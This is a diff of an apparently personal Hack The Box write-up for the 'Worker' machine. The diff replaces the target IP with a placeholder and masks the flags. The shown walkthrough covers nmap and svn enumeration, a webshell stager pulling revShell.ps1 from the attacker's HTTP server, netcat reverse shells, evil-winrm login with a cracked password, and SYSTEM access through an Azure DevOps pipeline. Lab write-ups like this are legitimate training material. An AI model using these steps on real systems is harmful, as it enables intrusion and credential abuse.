@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Worker
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-worker-infocard.png)
-
 Short description to include any strange things to be dealt with
 
 TODO: Finish writing and clean up
@@ -33,11 +31,11 @@ TODO: Finish writing and clean up
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.203`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/worker]
-└─$ nmap -sCV -n -p- -v 10.10.10.203                                                                   
+└─$ nmap -sCV -n -p- -v <YOUR_IP>                                                                   
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-28 18:40 EST
 NSE: Loaded 153 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -48,27 +46,27 @@ Completed NSE at 18:40, 0.00s elapsed
 Initiating NSE at 18:40
 Completed NSE at 18:40, 0.00s elapsed
 Initiating Ping Scan at 18:40
-Scanning 10.10.10.203 [2 ports]
+Scanning <YOUR_IP> [2 ports]
 Completed Ping Scan at 18:40, 0.06s elapsed (1 total hosts)
 Initiating Connect Scan at 18:40
-Scanning 10.10.10.203 [65535 ports]
-Discovered open port 80/tcp on 10.10.10.203
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 80/tcp on <YOUR_IP>
 Connect Scan Timing: About 18.58% done; ETC: 18:42 (0:02:16 remaining)
 Connect Scan Timing: About 46.95% done; ETC: 18:42 (0:01:09 remaining)
-Discovered open port 5985/tcp on 10.10.10.203
-Discovered open port 3690/tcp on 10.10.10.203
+Discovered open port 5985/tcp on <YOUR_IP>
+Discovered open port 3690/tcp on <YOUR_IP>
 Completed Connect Scan at 18:41, 105.47s elapsed (65535 total ports)
 Initiating Service scan at 18:41
-Scanning 3 services on 10.10.10.203
+Scanning 3 services on <YOUR_IP>
 Completed Service scan at 18:42, 6.09s elapsed (3 services on 1 host)
-NSE: Script scanning 10.10.10.203.
+NSE: Script scanning <YOUR_IP>.
 Initiating NSE at 18:42
 Completed NSE at 18:42, 1.01s elapsed
 Initiating NSE at 18:42
 Completed NSE at 18:42, 0.20s elapsed
 Initiating NSE at 18:42
 Completed NSE at 18:42, 0.00s elapsed
-Nmap scan report for 10.10.10.203
+Nmap scan report for <YOUR_IP>
 Host is up (0.044s latency).
 Not shown: 65532 filtered ports
 PORT     STATE SERVICE  VERSION
@@ -116,16 +114,16 @@ installed subversion `sudo apt install subversion`
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/worker]
-└─$ svn checkout http://10.10.10.203 
-svn: E170013: Unable to connect to a repository at URL 'http://10.10.10.203'
-svn: E175003: The server at 'http://10.10.10.203' does not support the HTTP/DAV protocol
+└─$ svn checkout http://<YOUR_IP> 
+svn: E170013: Unable to connect to a repository at URL 'http://<YOUR_IP>'
+svn: E175003: The server at 'http://<YOUR_IP>' does not support the HTTP/DAV protocol
 ```
 
 Was not able to connect the to page as HTTP, but after some reading found that there is a `SVN://` protocol.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/worker]
-└─$ svn checkout svn://10.10.10.203
+└─$ svn checkout svn://<YOUR_IP>
 A    dimension.worker.htb
 A    dimension.worker.htb/LICENSE.txt
 A    dimension.worker.htb/README.txt
@@ -369,8 +367,6 @@ After logging in, I found myself in a Azure DevOps portal as the user named `eke
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-profile.png)
 
-
-
 When I clicked on the profile picture, I found the user's name and domain login information.
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-notifications.png)
@@ -502,7 +498,7 @@ Put this command into the webshell input as a stager to get my reverse shell pow
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ python3 -m http.server 8909
 Serving HTTP on 0.0.0.0 port 8909 (http://0.0.0.0:8909/) ...
-10.10.10.203 - - [12/Dec/2020 17:35:03] "GET /revShell.ps1 HTTP/1.1" 200 -
+<YOUR_IP> - - [12/Dec/2020 17:35:03] "GET /revShell.ps1 HTTP/1.1" 200 -
 ```
 
 got connection to my waiting webserver which hosted a reverse shell ps1 script
@@ -522,7 +518,7 @@ Script started, output log file is 'typescript'.
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ nc -lvnp 8099
 listening on [any] 8099 ...
-connect to [10.10.15.98] from (UNKNOWN) [10.10.10.203] 50339
+connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 50339
 whoami /all
 
 USER INFORMATION
@@ -531,7 +527,6 @@ USER INFORMATION
 User Name                  SID                                                          
 ========================== =============================================================
 iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
-
 
 GROUP INFORMATION
 -----------------
@@ -548,7 +543,6 @@ NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory gro
 BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
 LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                      Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
-
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -721,9 +715,7 @@ net user showed a very long list of usernames
 ```text
 PS C:\windows\system32\inetsrv> ls \users
 
-
     Directory: C:\users
-
 
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
@@ -753,9 +745,7 @@ There was a second logical disk attached to the machine
 ```text
 PS W:\> ls 
 
-
     Directory: W:\
-
 
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
@@ -995,7 +985,7 @@ Retrieved the password for one of the users `robisl`
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/worker/winrm-brute]
-└─$ evil-winrm -u robisl -p wolves11 -i 10.10.10.203                                      
+└─$ evil-winrm -u robisl -p wolves11 -i <YOUR_IP>                                      
 
 Evil-WinRM shell v2.3
 
@@ -1009,7 +999,6 @@ USER INFORMATION
 User Name     SID
 ============= ==============================================
 worker\robisl S-1-5-21-3082756831-2119193761-3468718151-1330
-
 
 GROUP INFORMATION
 -----------------
@@ -1026,7 +1015,6 @@ NT AUTHORITY\This Organization         Well-known group S-1-5-15                
 NT AUTHORITY\Local account             Well-known group S-1-5-113                                      Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
-
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -1045,17 +1033,14 @@ Using `evil-winrm` I was able to login with the password specified for `robisl`
 *Evil-WinRM* PS C:\Users\robisl\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\robisl\Desktop> ls
 
-
     Directory: C:\Users\robisl\Desktop
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -ar---       12/12/2020  10:16 PM             34 user.txt
 
-
 *Evil-WinRM* PS C:\Users\robisl\Desktop> cat user.txt
-6266c82c4a400539708519fd31eb2a34
+****
 ```
 
 On the user's desktop I found the `user.txt` flag
@@ -1099,8 +1084,6 @@ Agetnt pool selection
 
 Assign the job to the agent
 
-
-
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14-run.png)
 
 Save and run
@@ -1123,7 +1106,7 @@ New Pipeline - Azure Repos Git - PartsUnlimited - Starter Pipeline
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ python3 -m http.server 8909
 Serving HTTP on 0.0.0.0 port 8909 (http://0.0.0.0:8909/) ...
-10.10.10.203 - - [12/Dec/2020 20:32:32] "GET /revShell.ps1 HTTP/1.1" 200 -
+<YOUR_IP> - - [12/Dec/2020 20:32:32] "GET /revShell.ps1 HTTP/1.1" 200 -
 ```
 
 My waiting python HTTP server got a connection request, and I could see that it sent the script.
@@ -1134,7 +1117,7 @@ My waiting python HTTP server got a connection request, and I could see that it 
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ nc -lvnp 8099                                                                                   1 ⨯
 listening on [any] 8099 ...
-connect to [10.10.15.98] from (UNKNOWN) [10.10.10.203] 51544
+connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 51544
 
 PS W:\agents\agent11\_work\8\s> whoami /all
 
@@ -1144,7 +1127,6 @@ USER INFORMATION
 User Name           SID     
 =================== ========
 nt authority\system S-1-5-18
-
 
 GROUP INFORMATION
 -----------------
@@ -1169,7 +1151,6 @@ NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                
 NT AUTHORITY\This Organization         Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
 LOCAL                                  Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
 BUILTIN\Administrators                 Alias            S-1-5-32-544                                   Enabled by default, Enabled group, Group owner    
-
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -1216,18 +1197,14 @@ I was happy to see that my script worked, and I got a reverse shell as `NT Autho
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ nc -lvnp 8099                                         
 listening on [any] 8099 ...
-connect to [10.10.15.98] from (UNKNOWN) [10.10.10.203] 51686
+connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 51686
 type C:\Administrator\Desktop\root.txt
 PS W:\agents\agent11\_work\10\s> cd C:\
 PS C:\> cd \users\Administrator\Desktop
 PS C:\users\Administrator\Desktop> type root.txt
-8af884b2e94242799a6b6dbb19eb9add
+****
 ```
 
 I unfortunately had to recreate my session as some automated process deleted it after a short time, but after so much effort I was able to retrieve my proof!
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-worker-pwned.png)
-
-Thanks to [`ekenas`](https://app.hackthebox.eu/users/222808) for... \[something interesting or useful about this machine.\]
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
